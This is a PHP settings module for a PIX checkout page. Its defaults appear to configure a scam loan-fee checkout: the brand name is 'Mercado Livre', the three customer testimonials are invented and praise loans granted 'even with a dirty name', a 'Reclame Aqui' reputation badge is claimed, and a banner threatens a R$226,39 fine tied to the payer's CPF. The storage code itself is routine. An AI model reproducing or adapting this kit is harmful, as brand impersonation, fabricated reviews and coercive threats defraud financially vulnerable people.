<?php
/**
 * Armazenamento central das configurações do checkout.
 * Suporta múltiplos checkouts via $checkout_id.
 */
if (!defined('CHECKOUT_BOOT')) { http_response_code(403); exit('Forbidden'); }

/** Valores de fábrica — usados enquanto o painel não salvou nada. */
function settings_defaults() {
    return [
        'marca' => [
            'nome'         => 'Mercado Livre',
            'logo'         => 'images/logo.png',
            'logo_altura'  => 42,
            'banner_img'        => '',
            'banner_img_altura' => 60,
            'banner_img_pos_y'  => 50,
        ],
        'cores' => [
            'primary'       => '#1B1464',
            'primary-light' => '#2D2A6E',
            'green'         => '#00A650',
            'green-dark'    => '#008C44',
            'green-soft'    => '#E8F8EE',
            'warning-bg'    => '#2D2A6E',
            'text'          => '#333333',
            'text-mid'      => '#666666',
            'text-light'    => '#999999',
            'border'        => '#E5E7EB',
            'bg'            => '#F3F4F6',
            'card'          => '#FFFFFF',
            'red'           => '#DC2626',
            'btn-pago-bg'   => '#FBBF24',
            'btn-pago-text' => '#1B1464',
            'titulo-cor'      => '#ffffff',
            'titulo-destaque' => '#FFB6D9',
            'titulo-desc'     => 'rgba(255,255,255,0.85)',
        ],
        'produto' => [
            'nome'          => 'Nome do Produto',
            'descricao'     => 'Descrição',
            'valor_cents'   => 5510,
            'modo_funil'    => false,
            'exibir_imagem' => true,
            'imagem'        => 'images/produto.png',
            'next_url'      => '/pagina-de-obrigado',
        ],
        'bump' => [
            'ativo'        => false,
            'badge'            => 'OFERTA EXCLUSIVA LIBERADA PRA VOCÊ',
            'badge_estilo'     => 'simples',
            'badge_fonte'      => 'Inter',
            'badge_tamanho'    => 12,
            'badge_peso'       => 800,
            'badge_espaco'     => 1,
            'badge_cor'        => '#D97706',
            'badge_maiusculas' => true,
            'badge_ok'     => 'OFERTA ADQUIRIDA',
            'titulo'       => 'Oferta especial',
            'descricao'    => 'Aproveite esta oferta exclusiva.',
            'titulo_ok'    => 'Oferta adicionada',
            'descricao_ok' => 'Adicionado ao seu pedido',
            'botao'        => 'PEGAR OFERTA',
            'valor_cents'  => 1390,
            'valor_antigo' => '',
            'imagem'       => '',
        ],
        'bump2' => [
            'ativo'        => false,
            'badge'            => '',
            'badge_cor'        => '#D97706',
            'badge_maiusculas' => true,
            'titulo'       => 'Oferta especial 2',
            'descricao'    => '',
            'titulo_ok'    => 'Oferta 2 adicionada',
            'descricao_ok' => 'Adicionado ao seu pedido',
            'botao'        => 'PEGAR OFERTA',
            'valor_cents'  => 0,
            'valor_antigo' => '',
            'imagem'       => '',
        ],
        'bump3' => [
            'ativo'        => false,
            'badge'            => '',
            'badge_cor'        => '#D97706',
            'badge_maiusculas' => true,
            'titulo'       => 'Oferta especial 3',
            'descricao'    => '',
            'titulo_ok'    => 'Oferta 3 adicionada',
            'descricao_ok' => 'Adicionado ao seu pedido',
            'botao'        => 'PEGAR OFERTA',
            'valor_cents'  => 0,
            'valor_antigo' => '',
            'imagem'       => '',
        ],
        'reviews' => [
            'ativo'       => true,
            'titulo'      => 'Reclame Aqui!',
            'subtitulo'   => 'A empresa atingiu a reputação máxima no Reclame AQUI!',
            'r1_nome' => 'Caroline Medeiros', 'r1_texto' => 'Eu achei que não ia receber o emprestimo, menos de 24 horas e caiu o valor certinho na minha conta, agora vou ficar mais tranquila', 'r1_foto' => 'images/avatar-1.jpeg', 'r1_estrelas' => 5,
            'r2_nome' => 'Daniela Rodrigues', 'r2_texto' => 'O empréstimo caiu na hora, nem acreditei, vou poder dar entrada no meu carro agora', 'r2_foto' => 'images/avatar-2.jpeg', 'r2_estrelas' => 5,
            'r3_nome' => 'Geane Gonçalves', 'r3_texto' => 'Agora sim vou passar as férias de janeiro bem com minhas filhas, obrigada por liberarem o empréstimo mesmo com nome sujo', 'r3_foto' => 'images/avatar-3.jpeg', 'r3_estrelas' => 4,
            'r4_nome' => '', 'r4_texto' => '', 'r4_foto' => '', 'r4_estrelas' => 5,
            'r5_nome' => '', 'r5_texto' => '', 'r5_foto' => '', 'r5_estrelas' => 5,
            'r6_nome' => '', 'r6_texto' => '', 'r6_foto' => '', 'r6_estrelas' => 5,
            'r7_nome' => '', 'r7_texto' => '', 'r7_foto' => '', 'r7_estrelas' => 5,
        ],
        'textos' => [
            'btn_pago_ativo'   => true,
            'btn_pago_texto'   => 'Já realizei o pagamento',
            'btn_pago_fonte'   => 'Inter',
            'btn_pago_icone'   => true,
            'banner'           => 'Este pagamento só pode ser realizado dentro do tempo, após este período, caso o pagamento não for confirmado <a href="#">sua solicitação será cancelada</a>. (<strong>Desistência gera multa de R$226,39 vinculada ao seu CPF</strong>, conforme os <a href="#">Termos de Uso</a>)',
            'banner_estilo'    => 'solida',
            'banner_fonte'     => 'Inter',
            'banner_tamanho'   => 13,
            'banner_peso'      => 700,
            'banner_espaco'    => 0.4,
            'banner_altura'    => 1.7,
            'banner_cor'       => '#FFFFFF',
            'banner_fundo'     => '#2D2A6E',
            'banner_maiusculas'=> true,
            'msg_pagamento'    => 'Ao selecionar o Pix, você será encaminhado para um ambiente seguro para finalizar seu pagamento.',
            'titulo_pix'       => 'Falta pouco! Para finalizar a compra, efetue o pagamento com PIX!',
        ],
        'gateway' => [
            'api_key'         => '',
            'pix_expira_dias' => 1,
        ],
    ];
}

/** IDs de checkout válidos e seus caminhos relativos. */
function checkouts_disponiveis() {
    return [
        'vega'      => ['nome' => 'Checkout Vega',  'pasta' => 'VEGA CHECKOUT/SISTEMA CHECKOUT'],
        'checkout2' => ['nome' => 'Checkout 2',      'pasta' => 'CHECKOUT 2/SISTEMA CHECKOUT'],
    ];
}

function settings_path($checkout_id = 'vega') {
    $id = preg_replace('/[^a-z0-9_-]/i', '', $checkout_id);
    if ($id === '' || $id === 'vega') return __DIR__ . '/data/settings.json';
    return __DIR__ . '/data/settings-' . $id . '.json';
}

/** Mescla recursiva rasa: preserva chaves novas dos defaults ao ler settings antigos. */
function settings_merge($defaults, $salvos) {
    foreach ($defaults as $grupo => $campos) {
        if (!is_array($campos)) {
            if (array_key_exists($grupo, $salvos)) $defaults[$grupo] = $salvos[$grupo];
            continue;
        }
        if (!isset($salvos[$grupo]) || !is_array($salvos[$grupo])) continue;
        foreach ($campos as $chave => $_) {
            if (array_key_exists($chave, $salvos[$grupo])) {
                $defaults[$grupo][$chave] = $salvos[$grupo][$chave];
            }
        }
    }
    return $defaults;
}

function settings_load($checkout_id = 'vega') {
    static $cache = [];
    if (isset($cache[$checkout_id])) return $cache[$checkout_id];

    $defaults = settings_defaults();
    $file = settings_path($checkout_id);
    if (!is_file($file)) { $cache[$checkout_id] = $defaults; return $defaults; }

    $salvos = json_decode((string)@file_get_contents($file), true);
    $cache[$checkout_id] = is_array($salvos) ? settings_merge($defaults, $salvos) : $defaults;
    return $cache[$checkout_id];
}

function settings_save($novos, $checkout_id = 'vega') {
    $file = settings_path($checkout_id);
    $dir = dirname($file);
    if (!is_dir($dir)) @mkdir($dir, 0750, true);

    $ht = $dir . '/.htaccess';
    if (!file_exists($ht)) @file_put_contents($ht, "Require all denied\nDeny from all\n");

    $merged = settings_merge(settings_defaults(), is_array($novos) ? $novos : []);
    $ok = @file_put_contents(
        $file,
        json_encode($merged, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
        LOCK_EX
    );
    return $ok !== false;
}
